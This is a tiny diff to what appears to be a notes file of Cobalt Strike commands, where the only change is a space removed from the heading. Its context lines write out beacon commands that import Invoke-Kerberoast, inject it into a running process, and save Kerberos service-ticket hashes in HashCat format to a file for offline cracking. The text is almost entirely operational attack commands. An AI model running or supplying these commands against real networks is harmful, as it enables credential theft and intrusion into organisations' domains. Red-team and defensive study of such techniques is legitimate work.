@@ -1,4 +1,4 @@
-# CobaltStrike commands and LOLBins:
+#CobaltStrike commands and LOLBins:
 
 beacon> powershell-import D:\Other\Invoke-Kerberoast.ps1
 beacon> psinject 2384 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8
